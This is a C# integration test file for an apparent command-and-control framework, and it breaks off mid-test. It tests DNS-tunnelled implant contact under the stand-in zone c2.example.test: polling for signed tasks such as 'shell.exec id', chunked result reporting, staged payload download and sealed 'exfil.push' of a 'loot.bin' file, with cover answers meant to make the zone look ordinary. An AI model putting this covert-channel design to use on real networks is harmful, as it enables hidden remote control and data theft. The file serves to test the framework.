using System.Net;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Google.Protobuf;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.CoreState;
using Rod.CoreState.Engagements;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;
using Rod.CoreState.Pki;
using Rod.Audit;
using Rod.Transport;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners;
using Rod.Transport.Listeners.Dns;
using Rod.Transport.Payloads;
using Rod.V1;

namespace Rod.Integration.Tests;

/// <summary>
/// The DNS contact surface (architecture.md Sec 8): the codec, the name
/// grammar, and the acceptance point -- an implant contacts over DNS against
/// a real listener entry. The unit checks pin the wire shapes; the end-to-end
/// check drives a real UDP socket against a real listener entry: a from-
/// scratch implant (a hand-rolled DNS client speaking the documented
/// contract) enrolls over HTTP, opens its session on the WebSocket beacon, then
/// polls and reports over DNS -- presence advances, a queued task arrives as
/// a signed TaskRequest in TXT, and its result lands in the audit trail.
/// </summary>
public class DnsContactTests
{
    private const string Zone = "c2.example.test";

    // --- The codec: query parse and response encode round-trip. ---

    [Fact]
    public void Codec_RoundTripsAQuery()
    {
        var query = BuildQuery(0x1234, DnsContactNames.PollName(ImplantId.New(), Zone));

        var parsed = DnsCodec.ParseQuery(query);

        Assert.NotNull(parsed);
        Assert.Equal((ushort)0x1234, parsed!.Id);
        Assert.Equal(DnsCodec.TxtType, parsed.Question!.Type);
        Assert.StartsWith("p.", parsed.Question.Name);
        Assert.EndsWith(Zone, parsed.Question.Name);
    }

    [Fact]
    public void Codec_EncodesATxtResponseWithEdns0()
    {
        var response = new DnsMessage
        {
            Id = 42,
            Question = new DnsQuestion("p." + Zone, DnsCodec.TxtType, 1),
            ResponseCode = 0,
        };
        response.Answers.Add(new DnsTxtAnswer("p." + Zone, new[] { "abc", "def" }));

        var datagram = DnsCodec.EncodeResponse(response);

        // QR set, one answer; a real resolver parses it -- here we assert the
        // structural bits: the header flags and the TXT strings survive.
        Assert.NotEqual(0, datagram[2] & 0x80);
        var answerCount = (datagram[6] << 8) | datagram[7];
        Assert.Equal(1, answerCount);
        var text = Encoding.ASCII.GetString(datagram);
        Assert.Contains("abc", text);
        Assert.Contains("def", text);
    }

    [Fact]
    public void Codec_RejectsGarbage()
    {
        Assert.Null(DnsCodec.ParseQuery(new byte[] { 1, 2, 3 }));
        Assert.Null(DnsCodec.ParseQuery(new byte[12]));
    }

    [Fact]
    public void Codec_EncodesAnACoverAnswer()
    {
        var response = new DnsMessage
        {
            Id = 7,
            Question = new DnsQuestion("www." + Zone, DnsCodec.AType, 1),
            ResponseCode = 0,
        };
        response.AAnswers.Add(new DnsAAnswer("www." + Zone, IPAddress.Parse("203.0.113.10")));

        var datagram = DnsCodec.EncodeResponse(response);

        var answerCount = (datagram[6] << 8) | datagram[7];
        Assert.Equal(1, answerCount);
        Assert.Contains("www", Encoding.ASCII.GetString(datagram));
        // The rdata carries the four address bytes contiguously.
        Assert.True(ContainsSequence(datagram, new byte[] { (byte)203, (byte)0, (byte)113, (byte)10 }));
    }

    // Byte-subsequence search for wire assertions: the codecs carry no
    // offsets out, so rdata checks locate the bytes.
    private static bool ContainsSequence(byte[] hay, byte[] needle)
    {
        for (var offset = 0; offset + needle.Length <= hay.Length; offset++)
        {
            var match = true;
            for (var probe = 0; probe < needle.Length; probe++)
            {
                if (hay[offset + probe] != needle[probe])
                {
                    match = false;
                    break;
                }
            }
            if (match)
                return true;
        }
        return false;
    }

    // --- The name grammar. ---

    [Fact]
    public void Grammar_PollRoundTrips()
    {
        var implant = ImplantId.New();

        var parsed = DnsContactNames.TryParsePoll(DnsContactNames.PollName(implant, Zone), Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Null(DnsContactNames.TryParsePoll("x." + Zone, Zone));
        Assert.Null(DnsContactNames.TryParsePoll("p." + DnsContactNames.Encode(implant.ToString()) + ".other.test", Zone));
    }

    [Fact]
    public void Grammar_SealedPollRoundTrips()
    {
        var implant = ImplantId.New();
        var keyId = Guid.NewGuid();

        var parsed = DnsContactNames.TryParseSealedPoll(DnsContactNames.SealedPollName(implant, keyId, Zone), Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(keyId, parsed.KeyId);
        // The plain poll parser does not claim a k-name, and the sealed parser
        // does not claim a p-name: the two carriages stay disjoint.
        Assert.Null(DnsContactNames.TryParsePoll(DnsContactNames.SealedPollName(implant, keyId, Zone), Zone));
        Assert.Null(DnsContactNames.TryParseSealedPoll(DnsContactNames.PollName(implant, Zone), Zone));
        Assert.Null(DnsContactNames.TryParseSealedPoll("k." + DnsContactNames.Encode(implant.ToString()) + "." + Zone, Zone));
    }

    [Fact]
    public void Grammar_DeliveryProbeRoundTrips()
    {
        var implant = ImplantId.New();
        var task = TaskId.New();
        var sha = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes("uid=0(root)"))[..16];

        var name = DnsContactNames.ProbeName(implant, task, sha, Zone);
        var parsed = DnsContactNames.TryParseDelivery(name, Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(task, parsed.Task);
        Assert.Equal(sha, parsed.Sha);
        // A wrong sha is a different question, not a parse failure -- the
        // server's answer separates them.
        var other = DnsContactNames.TryParseDelivery(
            DnsContactNames.ProbeName(implant, task, new byte[16], Zone), Zone);
        Assert.NotNull(other);
        Assert.NotEqual(sha, other!.Sha);
    }

    [Fact]
    public void Grammar_ResultChunkRoundTrips()
    {
        var implant = ImplantId.New();
        var task = TaskId.New();
        var chunk = Encoding.UTF8.GetBytes("uid=0(root)");

        var name = DnsContactNames.ResultName(implant, task, succeeded: true, sequence: 0, terminal: true, chunk, Zone);
        var parsed = DnsContactNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(task, parsed.Task);
        Assert.Equal(Rod.CoreState.Tasks.TaskOutcome.Succeeded, parsed.Outcome);
        Assert.Equal(0, parsed.Sequence);
        Assert.True(parsed.Terminal);
        Assert.Equal(chunk, parsed.Chunk);
    }

    [Fact]
    public void Grammar_EmptyChunkRidesAsTheBareLabel()
    {
        var name = DnsContactNames.ResultName(
            ImplantId.New(), TaskId.New(), succeeded: false, sequence: 0, terminal: true, Array.Empty<byte>(), Zone);

        var parsed = DnsContactNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Empty(parsed!.Chunk);
    }

    [Fact]
    public void Reassembler_ConcatenatesInOrder_AndDropsGaps()
    {
        var reassembler = new DnsContactNames.ResultReassembler();
        var task = TaskId.New();
        Assert.Null(reassembler.Add(task, 0, terminal: false, Encoding.UTF8.GetBytes("uid=")));
        Assert.Null(reassembler.Add(task, 1, terminal: false, Encoding.UTF8.GetBytes("0(")));

        var output = reassembler.Add(task, 2, terminal: true, Encoding.UTF8.GetBytes("root)"));
        Assert.NotNull(output);
        Assert.Equal("uid=0(root)", Encoding.UTF8.GetString(output!));

        // A terminal chunk with a gap before it reassembles nothing.
        var gapped = reassembler.Add(TaskId.New(), 1, terminal: true, Encoding.UTF8.GetBytes("orphan"));
        Assert.Null(gapped);
    }

    [Fact]
    public void Reassembler_AFullMapStillAdmitsTheTaskInHand()
    {
        // Spoofed debris used to evict the newly arrived task instead of
        // the stalest entry: a full map starved every live task after it.
        // The caps must push out the least recently touched entry, never
        // the task in hand.
        var reassembler = new DnsContactNames.ResultReassembler();
        for (var i = 0; i < DnsContactNames.ResultReassembler.MaxTasks; i++)
            Assert.Null(reassembler.Add(TaskId.New(), 0, terminal: false, Encoding.UTF8.GetBytes("debris")));

        var live = TaskId.New();
        var output = reassembler.Add(live, 0, terminal: true, Encoding.UTF8.GetBytes("uid=0(root)"));
        Assert.NotNull(output);
        Assert.Equal("uid=0(root)", Encoding.UTF8.GetString(output!));
    }

    [Fact]
    public void Reassembler_IdleEntriesLeaveWithoutATerminal()
    {
        // A result sequence whose terminal chunk never comes must not
        // occupy the map forever -- the idle window retires it.
        var clock = new MutableClock();
        var reassembler = new DnsContactNames.ResultReassembler(clock);

        var task = TaskId.New();
        Assert.Null(reassembler.Add(task, 0, terminal: false, Encoding.UTF8.GetBytes("half")));
        clock.Advance(DnsContactNames.ResultReassembler.IdleEviction + TimeSpan.FromSeconds(1));

        // A later task's terminal chunk reassembles while the abandoned
        // entry is retired by the same sweep.
        var fresh = reassembler.Add(TaskId.New(), 0, terminal: true, Encoding.UTF8.GetBytes("done"));
        Assert.NotNull(fresh);
        Assert.Equal("done", Encoding.UTF8.GetString(fresh!));

        // The abandoned task restarts from zero after eviction: its old
        // chunk 0 is gone, so a terminal chunk 1 reassembles nothing.
        Assert.Null(reassembler.Add(task, 1, terminal: true, Encoding.UTF8.GetBytes("rest")));
    }

    private sealed class MutableClock : TimeProvider
    {
        private DateTimeOffset _now = DateTimeOffset.UnixEpoch;
        public override DateTimeOffset GetUtcNow() => _now;
        public void Advance(TimeSpan span) => _now += span;
    }

    // --- The acceptance point: an implant contacts over DNS. ---

    [Fact]
    public async Task Cover_AnAQueryInTheZoneAnswersAnAddress()
    {
        await using var env = await DnsTestEnv.StartAsync();

        // An A query for an unknown name in the zone: NOERROR with one A
        // record -- the ordinary v4-zone shape, not the TXT-only oddity an
        // NXDOMAIN-everything zone reads as. The test env binds 127.0.0.1,
        // so the cover address is the bind's own host.
        var datagram = await env.DnsQueryRawAsync("www." + Zone, DnsCodec.AType);
        Assert.True(datagram.Length >= 12);
        Assert.Equal(0, datagram[3] & 0x0F);
        Assert.Equal(1, (datagram[6] << 8) | datagram[7]);
        Assert.True(ContainsSequence(datagram, new byte[] { 127, 0, 0, 1 }));

        // A repeat answers the same address: the cover is deterministic,
        // the behavior resolvers cache by.
        var again = await env.DnsQueryRawAsync("www." + Zone, DnsCodec.AType);
        Assert.Equal(0, again[3] & 0x0F);
        Assert.True(ContainsSequence(again, new byte[] { 127, 0, 0, 1 }));

        // AAAA stays NXDOMAIN: a v4-only zone is the ordinary shape, and
        // inventing v6 records adds no cover.
        var aaaa = await env.DnsQueryRawAsync("www." + Zone, 28);
        Assert.Equal(3, aaaa[3] & 0x0F);

        // A TXT query for a non-contact name keeps its NXDOMAIN: the cover
        // widens the zone's record types, not the contact surface.
        var txt = await env.DnsQueryAsync("www." + Zone);
        Assert.Null(txt);
    }

    [Fact]
    public async Task Implant_ContactsOverDns_AgainstARealListenerEntry()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();

        // The implant opens its session on the WebSocket beacon first: DNS refreshes
        // a session, it does not handshake (the documented transport tradeoff).
        // The implant opens its session on the WebSocket beacon first: DNS
        // refreshes a session, it does not handshake (the documented
        // transport tradeoff).
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
            Assert.Equal(HandshakeStatus.Ok, (await beacon.ReceiveHandshakeAsync()).Status);
        }

        // A queued task is claimed over DNS: the poll answer carries the
        // signed TaskRequest in TXT, base32 across its strings.
        await env.LoginAsync();

        // The DNS listener entry is real in the registry: Running, Dns, our
        // zone. Read through the registry: the listener rides the startup
        // configuration, and the engagement-scoped listing does not (and must
        // not) surface that tier.
        var registry = env.Host.Services.GetRequiredService<IListenerRegistry>();
        Assert.Contains(await registry.ListAsync(), l =>
            l.Transport == "dns"
            && l.State == ListenerState.Running
            && l.PublicEndpoint == Zone);

        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.PollName(implant.Id, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var framed));
        // The poll answer carries a kind byte ahead of its message: 't' names
        // the TaskRequest ('i' would name parked channel input).
        Assert.Equal((byte)'t', framed![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(framed[1..]);
        Assert.Equal(issuedBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("shell.exec", taskRequest.Verb);
        Assert.Equal("id", taskRequest.Arguments);

        // The tasking signature verifies with the CA's public key even over
        // DNS: the datagram transport does not weaken the Sec 9 posture. The
        // signed bytes are the canonical tuple (architecture.md Sec 9), not
        // the serialized message.
        Assert.True(VerifyTasking(env.CaCertificates()[0], implant.Id.ToString(), taskRequest));

        // The implant reports the result as DNS chunks; the task completes
        // with the same audit arc a stream-delivered result produces.
        var output = "uid=0(root) gid=0(root)";
        var chunks = Chunk(Encoding.UTF8.GetBytes(output), 20);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal("Succeeded", fetched.Outcome);
        Assert.Equal(output, fetched.Output);

        // Presence advanced over DNS: the session's last-seen reflects the
        // contacts (the implant reads online with no beacon frames in flight).
        var implants = await env.Http.GetFromJsonAsync<ImplantBody[]>(
            $"/engagements/{implant.EngagementId}/implants");
        Assert.Contains(implants!, i => i.ImplantId == implant.Id.ToString() && i.IsOnline);
    }

    [Fact]
    public async Task Sealed_KeyedArtifact_PollsAndReportsUnderCiphertext()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();
        // The implant opens its session on the WebSocket beacon first: DNS
        // refreshes a session, it does not handshake (the documented
        // transport tradeoff).
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
            Assert.Equal(HandshakeStatus.Ok, (await beacon.ReceiveHandshakeAsync()).Status);
        }

        // The artifact's build minted an envelope key: the payload record
        // carries the teamserver's half, and the enrollment bound the implant
        // to it -- the state a k-poll re-derives on its own after a restart.
        var (keyId, key) = AesGcmEnvelope.Mint();
        var payloads = env.Host.Services.GetRequiredService<IPayloadStore>();
        await payloads.SaveAsync(new PayloadRecord(
            Guid.NewGuid(), implant.EngagementId.Value, "dotnet", "csharp",
            "application/octet-stream", "sealed-test", Array.Empty<byte>(), 0, DateTimeOffset.UtcNow,
            EnvelopeKeyId: keyId, EnvelopeKey: key), CancellationToken.None);
        env.Host.Services.GetRequiredService<EnvelopeContactKeys>().Bind(implant.Id, keyId, key);

        await env.LoginAsync();
        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        // The downgrade refusal: a plain p-poll from a key-bound implant
        // answers nothing -- the tasking is never handed down in the clear.
        Assert.Null(await env.DnsQueryAsync(DnsContactNames.PollName(implant.Id, Zone)));

        // The k-poll's answer is a raw R1 body under the DNS poll purpose
        // tag: no kind byte, no protobuf, nothing readable rides the wire.
        var sealedAnswer = await env.DnsQueryAsync(DnsContactNames.SealedPollName(implant.Id, keyId, Zone));
        Assert.NotNull(sealedAnswer);
        Assert.True(DnsContactNames.TryDecode(sealedAnswer, out var sealedBytes));
        Assert.True(sealedBytes!.Length >= 2 && sealedBytes[0] == (byte)'R' && sealedBytes[1] == (byte)'1');
        var opened = AesGcmEnvelope.TryUnwrapBody(sealedBytes, keyId, key, AesGcmEnvelope.DnsPollAad);
        Assert.NotNull(opened);
        Assert.Equal((byte)'t', opened![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(opened[1..]);
        Assert.Equal(issuedBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("shell.exec", taskRequest.Verb);
        Assert.Equal("id", taskRequest.Arguments);

        // The result seals whole under the result purpose tag, then chunks;
        // the task completes with the plaintext the server unwrapped.
        var output = "uid=0(root) gid=0(root)";
        var blob = AesGcmEnvelope.WrapBody(Encoding.UTF8.GetBytes(output), keyId, key, AesGcmEnvelope.DnsResultAad);
        var chunks = Chunk(blob, 39);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal("Succeeded", fetched.Outcome);
        Assert.Equal(output, fetched.Output);

        // The upstream refusal: a plaintext reassembly from the bound implant
        // is dropped, so a task never completes off cleartext chunks. The
        // drop is decided inside the r-query's own answer cycle -- the
        // response datagram cannot precede it -- so one read settles it.
        var issuedPlain = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "whoami" });
        issuedPlain.EnsureSuccessStatusCode();
        var issuedPlainBody = await issuedPlain.Content.ReadFromJsonAsync<TaskIssuedBody>();
        Assert.NotNull(await env.DnsQueryAsync(DnsContactNames.SealedPollName(implant.Id, keyId, Zone)));

        var plain = Chunk(Encoding.UTF8.GetBytes("forged plaintext output"), 20);
        for (var i = 0; i < plain.Count; i++)
        {
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, Guid.TryParse(issuedPlainBody!.TaskId, out var pid) ? new TaskId(pid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == plain.Count - 1, plain[i], Zone));
        }
        var plainFetched = await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{issuedPlainBody!.TaskId}");
        Assert.NotNull(plainFetched);
        Assert.NotEqual("Completed", plainFetched!.Status);
    }

    // The degraded path's staged acceptance (ADR-010): the staged task
    // claims over DNS (its TaskRequest is small; the payload never rides
    // the poll), the s./d. exchange carries the transfer, an abandoned
    // download resumes from the proven seam, and the r.-chunk report rides
    // the both-side hash on its text tail -- the task completes with the
    // token stripped and the hash verified.
    [Fact]
    public async Task Staged_AnInterruptedTransferResumes_OverTheDegradedPath()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
            Assert.Equal(HandshakeStatus.Ok, (await beacon.ReceiveHandshakeAsync()).Status);
        }

        await env.LoginAsync();
        var content = RandomNumberGenerator.GetBytes(700);
        var expectedHash = Convert.ToHexString(SHA256.HashData(content)).ToLowerInvariant();
        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "file.push", Arguments = "/tmp/rod-dns-staged", Content = content });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.PollName(implant.Id, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var framed));
        Assert.Equal((byte)'t', framed![0]);
        var request = TaskRequest.Parser.ParseFrom(framed[1..]);
        Assert.Equal(issuedBody!.TaskId, request.TaskId);
        Assert.True(request.HasStagedBytes);
        Assert.Equal((ulong)content.Length, request.StagedBytes);
        var task = new TaskId(Guid.Parse(request.TaskId));

        // The fresh demand answers a token for the whole payload.
        var freshToken = await DemandStagedAsync(env, implant, task, 0, null);
        Assert.NotNull(freshToken);

        // One answer-sized chunk lands, then the download is abandoned -- a
        // lost cycle, an evicted token: the held bytes are all the implant
        // keeps.
        var first = await DownloadChunkAsync(env, freshToken!, 0);
        Assert.NotNull(first);
        Assert.False(first!.Value.Terminal);
        var held = first.Value.Data;
        Assert.Equal(200, held.Length);

        // The resumed demand names the seam and proves it by hash; the new
        // token's first chunk serves from the honored offset.
        var resumedToken = await DemandStagedAsync(env, implant, task, held.Length, SHA256.HashData(held));
        Assert.NotNull(resumedToken);
        var resumedFirst = await DownloadChunkAsync(env, resumedToken!, 0);
        Assert.NotNull(resumedFirst);
        Assert.Equal(content[200..400], resumedFirst!.Value.Data);

        var payload = new List<byte>(held);
        for (var sequence = 0; ; sequence++)
        {
            var part = await DownloadChunkAsync(env, resumedToken!, sequence);
            Assert.NotNull(part);
            payload.AddRange(part!.Value.Data);
            if (part.Value.Terminal)
                break;
        }
        Assert.Equal(content, payload);

        // The report rides the r-chunks with the payload hash on its tail;
        // the task completes Succeeded with the token stripped and the
        // server-side check passed against the served artifact.
        var report = $"/tmp/rod-dns-staged: {content.Length} bytes written";
        var blob = Encoding.UTF8.GetBytes(report + "\nsha256:" + expectedHash);
        var chunks = Chunk(blob, 39);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsContactNames.ResultName(
                implant.Id, task, succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{request.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Succeeded", fetched!.Outcome);
        Assert.Equal(report, fetched.Output);
    }

    // The upload arm's degraded acceptance (ADR-010): a keyed artifact's
    // exfil run rides the x./u. grammar -- each blob one sealed ExfilChunk
    // slice placing at its offset, the seam probe answering the held count
    // the next blob serves from, and the terminal blob materializing the
    // artifact whole. Sealed-only: a plaintext blob never places.
    [Fact]
    public async Task Exfil_SealedBlobsCarryTheRun_OverTheSeamGrammar()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var implant = await env.EnrollImplantAsync();
        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
        {
            Assert.Equal(HandshakeStatus.Ok, (await beacon.ReceiveHandshakeAsync()).Status);
        }

        var (keyId, key) = AesGcmEnvelope.Mint();
        var payloads = env.Host.Services.GetRequiredService<IPayloadStore>();
        await payloads.SaveAsync(new PayloadRecord(
            Guid.NewGuid(), implant.EngagementId.Value, "dotnet", "csharp",
            "application/octet-stream", "sealed-test", Array.Empty<byte>(), 0, DateTimeOffset.UtcNow,
            EnvelopeKeyId: keyId, EnvelopeKey: key), CancellationToken.None);
        env.Host.Services.GetRequiredService<EnvelopeContactKeys>().Bind(implant.Id, keyId, key);

        await env.LoginAsync();
        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "exfil.push", Arguments = "loot.bin /opt/loot.bin" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();
        var task = new TaskId(Guid.Parse(issuedBody!.TaskId));

        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.SealedPollName(implant.Id, keyId, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var sealedBytes));
        var opened = AesGcmEnvelope.TryUnwrapBody(sealedBytes!, keyId, key, AesGcmEnvelope.DnsPollAad);
        Assert.NotNull(opened);
        Assert.Equal((byte)'t', opened![0]);
        var request = TaskRequest.Parser.ParseFrom(opened[1..]);
        Assert.Equal("exfil.push", request.Verb);

        // Serve the run as the reference implant does: datagram-sized blobs,
        // each one sealed ExfilChunk slice, the seam probe between them.
        var content = RandomNumberGenerator.GetBytes(2 * 3800 + 137);
        async Task<string?> ProbeSeamAsync()
        {
            var nameSha = SHA256.HashData(Encoding.UTF8.GetBytes("loot.bin"))[..16];
            var answer = await env.DnsQueryAsync(
                "x." + DnsContactNames.Encode(task.ToString())
                + "." + DnsContactNames.Encode(nameSha)
                + "." + DnsContactNames.Encode(implant.Id.ToString())
                + "." + Zone);
            return answer is not null && DnsContactNames.TryDecode(answer, out var held)
                ? Encoding.ASCII.GetString(held!)
                : null;
        }

        async Task UploadBlobAsync(ExfilChunk slice)
        {
            var blob = AesGcmEnvelope.WrapBody(slice.ToByteArray(), keyId, key, AesGcmEnvelope.DnsExfilAad);
            var chunks = Chunk(blob, 39);
            var stream = RandomNumberGenerator.GetBytes(8);
            for (var i = 0; i < chunks.Count; i++)
            {
                var name = "u." + DnsContactNames.Encode(stream)
                    + "." + i.ToString(System.Globalization.CultureInfo.InvariantCulture)
                    + "." + (i == chunks.Count - 1 ? "t" : "m")
                    + "." + DnsContactNames.Encode(chunks[i])
                    + "." + DnsContactNames.Encode(implant.Id.ToString())
                    + "." + Zone;
                var ack = await env.DnsQueryAsync(name);
                Assert.NotNull(ack);
            }
        }

        var declared = ByteString.CopyFrom(SHA256.HashData(content));
        for (var from = 0; from < content.Length; from += 3800)
        {
            var take = Math.Min(3800, content.Length - from);
            var data = new byte[take];
            Array.Copy(content, from, data, 0, take);
            await UploadBlobAsync(new ExfilChunk
            {
                TaskId = task.ToString(),
                Name = "loot.bin",
                ContentType = "application/octet-stream",
                Sequence = 0,
                Terminal = from + take >= content.Length,
                Offset = (ulong)from,
                PayloadSha256 = declared,
                Data = ByteString.CopyFrom(data),
            });
            var seam = await ProbeSeamAsync();
            Assert.NotNull(seam);
            Assert.Equal((from + take).ToString(), seam);
        }

        // The terminal blob placed the whole run: the artifact materialized
        // engagement-scoped and bound to the task.
        var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
        var stored = await WaitUntilAsync(async () =>
            (await artifacts.ForTaskAsync(task.Value)).FirstOrDefault(a => a.Name == "loot.bin"));
        Assert.NotNull(stored);
        Assert.Equal(content, stored!.Content);

        // Sealed-only: a plaintext terminal blob (the arm's spoofing
        // decision) never places -- the probe answers zero for it.
        var plainIssued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "exfil.push", Arguments = "forged.bin /opt/forged.bin" });
        plainIssued.EnsureSuccessStatusCode();
        var plainBody = await plainIssued.Content.ReadFromJsonAsync<TaskIssuedBody>();
        var plainTask = new TaskId(Guid.Parse(plainBody!.TaskId));
        var forged = new ExfilChunk
        {
            TaskId = plainTask.ToString(),
            Name = "forged.bin",
            ContentType = "application/octet-stream",
            Sequence = 0,
            Terminal = true,
            Offset = 0,
            PayloadSha256 = ByteString.CopyFrom(SHA256.HashData("forged"u8.ToArray())),
            Data = ByteString.CopyFrom("forged"u8.ToArray()),
        };
        var plainChunks = Chunk(forged.ToByteArray(), 39);
        var plainStream = RandomNumberGenerator.GetBytes(8);
        for (var i = 0; i < plainChunks.Count; i++)
        {
            var name = "u." + DnsContactNames.Encode(plainStream)
                + "." + i.ToString(System.Globalization.CultureInfo.InvariantCulture)
                + "." + (i == plainChunks.Count - 1 ? "t" : "m")
                + "." + DnsContactNames.Encode(plainChunks[i])
                + "." + DnsContactNames.Encode(implant.Id.ToString())
                + "." + Zone;
            await env.DnsQueryAsync(name);
        }
        var forgedNameSha = SHA256.HashData(Encoding.UTF8.GetBytes("forged.bin"))[..16];
        var forgedAnswer = await env.DnsQueryAsync(
            "x." + DnsContactNames.Encode(plainTask.ToString())
            + "." + DnsContactNames.Encode(forgedNameSha)
            + "." + DnsContactNames.Encode(implant.Id.ToString())
            + "." + Zone);
        Assert.NotNull(forgedAnswer);
        Assert.True(DnsContactNames.TryDecode(forgedAnswer, out var forgedHeld));
        Assert.Equal("0", Encoding.ASCII.GetString(forgedHeld!));
    }

    // One staged demand: the answer's token bytes, or null when the demand
    // carried no answer.
    private static async Task<byte[]?> DemandStagedAsync(
        DnsTestEnv env, Implant implant, TaskId task, long offset, byte[]? prefixSha)
    {
        var name = "s." + DnsContactNames.Encode(task.ToString())
            + "." + offset.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (prefixSha is null ? "e" : DnsContactNames.Encode(prefixSha))
            + "." + DnsContactNames.Encode(implant.Id.ToString())
            + "." + Zone;
        var answer = await env.DnsQueryAsync(name);
        if (answer is null || !DnsContactNames.TryDecode(answer, out var part))
            return null;
        var text = Encoding.ASCII.GetString(part!);
        return text.StartsWith("=") && DnsContactNames.TryDecode(text[1..], out var token)
            ? token
            : null;
    }

    // One staged-download probe: the answer's (terminal, chunk), or null
    // when the probe carried no answer.
    private static async Task<(bool Terminal, byte[] Data)?> DownloadChunkAsync(
        DnsTestEnv env, byte[] token, int sequence)
    {
        var answer = await env.DnsQueryAsync(
            "d." + DnsContactNames.Encode(token) + "." + sequence + "." + Zone);
        if (answer is null || !DnsContactNames.TryDecode(answer, out var part))
            return null;
        var text = Encoding.ASCII.GetString(part!);
        var dot = text.IndexOf('.');
        return dot == 1
            && DnsContactNames.TryDecode(text[(dot + 1)..], out var chunk)
            ? (text[..dot] == "t", chunk)
            : null;
    }

    [Fact]
    public async Task Poll_AnOversizeTaskDoesNotBlockTheTaskBehindIt()
    {
        // A marshaled request past the datagram budget parks, requeued for a
        // stream carrier -- but a strict head-of-line claim would hand the
        // same task back on every poll and starve the queued tasking behind
        // it for a DNS-only implant. The poll must pass over the oversized
        // task and serve the next one that fits.
